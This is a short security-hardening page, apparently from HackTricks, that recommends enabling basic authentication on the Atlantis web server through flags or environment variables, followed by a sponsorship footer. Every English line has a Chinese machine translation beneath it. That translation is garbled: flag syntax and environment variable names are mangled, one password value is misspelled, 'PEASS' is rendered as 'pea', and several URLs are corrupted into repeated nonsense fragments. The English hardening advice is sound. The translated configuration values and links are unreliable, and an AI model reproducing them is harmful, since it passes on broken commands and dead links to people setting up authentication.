### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

###在Atlantis Web服务器上启用身份验证<a href="#enable-authentication-on-atlantis-web-server" id="id="enable-authentication-on-atlantis-web-server"> </a> </a>

It is very recommended to enable authentication in the web service. Enable BasicAuth using the `--web-basic-auth=true` and setup a username and a password using `--web-username=yourUsername` and `--web-password=yourPassword` flags.

非常建议在Web服务中启用身份验证。 使用`-web-basic-auth = true`启用basicauth并使用`-web-username = yourusername`和`-web-password = yourpassword“ flags flags”设置用户名和密码。

You can also pass these as environment variables `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` and `ATLANTIS_WEB_PASSWORD=yourPassword`.

您也可以将这些传递为环境变量`atlantis_web_basic_auth = true``Atlantis_web_username = yourusername`和atlantis_web_password = yypassword“ yourusername”。

## References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)\*\*\*\*

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

*您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

*发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

*获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

** **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

***通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
